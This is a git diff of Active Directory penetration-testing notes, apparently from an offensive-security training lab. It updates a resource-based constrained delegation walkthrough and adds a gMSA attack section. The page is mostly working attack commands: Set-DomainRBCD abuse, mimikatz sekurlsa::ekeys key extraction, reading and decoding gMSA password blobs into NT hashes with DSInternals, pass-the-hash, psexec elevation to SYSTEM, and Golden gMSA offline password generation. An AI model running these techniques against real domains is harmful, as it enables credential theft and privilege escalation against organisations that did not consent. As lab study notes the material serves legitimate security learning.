@@ -418,24 +418,29 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 
 We need two privileges
 
-1. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain ms DS MachineAccountQuota is 10 for all domain users)
-2. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
+1. Control over an object which has SPN configured or set SPN (like admin access to a domain joined machine or ability to join a machine to domain ms DS MachineAccountQuota is 10 for all domain users)
+2. Write permissions over the target service or object (ACL) to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
 
 ### Tool
 
-Find Write ACL on machines (do that with every user you own)
+**Find Write ACL on machines (do that with every user you own) - write on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute**
 
 ```powershell
 Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
-
+Get-DomainRBCD
 
 cd ADModule-master
 Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
 Import-Module .\ActiveDirectory\ActiveDirectory.psd1
-
-
-Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'your-username' -Verbose
 ```
+
+**Set RBCD on dcorp-mgmt for the student VMs**:
+
+{% code overflow="wrap" %}
+```powershell
+Set-DomainRBCD -Identity hostname-target-from-find-interesting-acl -DelegateFrom 'your-machine-account$' -Verbose
+```
+{% endcode %}
 
 **Get your own Machine Account AES-Hash**
 
@@ -443,7 +448,7 @@ Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'your-username' -Verbose
 Invoke-mimikatz -command '"sekurlsa::ekeys"'
 ```
 
-Access the machine with our AES key with ANY user we wanode
+**Access the machine with our AES key with ANY user we want**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -507,3 +512,63 @@ Modify the kdns.c with your own payload. This is a synchronous task, so if you s
 
 <figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
+## 👾gMSA - Group Managed Service Account
+
+### Description
+
+* A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers
+* Use of gMSA is recommended to protect from Kerberoast type attacks!
+* A 256 bytes random password is generated and is rotated every 30 days.
+* When an authorized user reads the attribute 'msds-ManagedPassword’ the gMSA password is computed
+* Only explicitly specified principals can read the password blob. Even the Domain Admins can't read it by default.
+* A gMSA has object class 'msDS-GroupManagedServiceAccount'. This can be used to find the accounts.
+* The attribute 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob. This can be computers or users.
+* The attribute 'msDS-ManagedPassword' stores the password blob in binary form of MSDS-MANAGEDPASSWORD\_BLOB
+* Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash
+* The 'CurrentPassword' attribute in the $decodedpwd contains the clear-text password but cannot be typed!
+* When computer account is needed for the PW you need a SYSTEM prompt to act with the computer account to DC
+  * Here I use PSEXEC to spawn a command shell running under the context of the local SYSTEM account. Once running as SYSTEM, we can perform the same action as shown above. The computer account has the right to pull the password, but not a user on that computer, so I elevate to SYSTEM which then interacts with AD as the associated AD computer account. Now I can get the GMSA password.
+  * psexec -i -s powershell.exe
+
+### Requirement
+
+### Tool
+
+{% code overflow="wrap" %}
+```powershell
+**Enumerate**
+Get-DomainObject -LDAPFilter '(objectClass=msDSGroupManagedServiceAccount)'
+
+ADModule
+Get-ADServiceAccount -Filter *
+Get-ADServiceAccount -Identity usernameHere -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+
+**Get Hash on a server**
+You need to use Sekurlsa::ekeys / sekurlsa:logonpasswords ntlm hash wont work
+
+**Exploit**
+Once we have compromised a principal that can read the blob
+$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDSManagedPassword).'msDS-ManagedPassword'
+Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
+$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
+ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+sekurlsa::pth /user:usernameHere /domain:dom.local /ntlm:0......
+
+**Verify that PW matches from AD**
+Next step I perform in the lab is to to confirm that the NT password hash that DSInternals provides matches that in Active Directory.
+I use the DSInternals command Get-ADReplAccount to get the AD password hash and can confirm that the password hash pulled from the GMSA is the same as that gathered from AD.
+$account = get-adreplaccount -samaccountname 'username/machinename$' -server hostname.dom.local
+$hash2 = convertto-hex -input $account.nthash
+$hash2
+
+```
+{% endcode %}
+
+**Golden gMSA**
+
+* gMSA password is calculated by leveraging the secret stored in KDS root key object.
+* Once we compute the GKE for the associated KDS root key we can generate the password offline
+* Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key.
+* Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.
+* Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline.
+* We need following attributes of the KDS root key to compute the Group Key Envelope (GKE) : – cn – msKds-SecretAgreementParam – msKds-RootKeyData – msKds-KDFParam – msKds-KDFAlgorithmID – msKds-CreateTime – msKds-UseStartTime – msKds-Version – msKds-DomainID – msKds-PrivateKeyLength – msKds-PublicKeyLength – msKds-SecretAgreementAlgorithmID
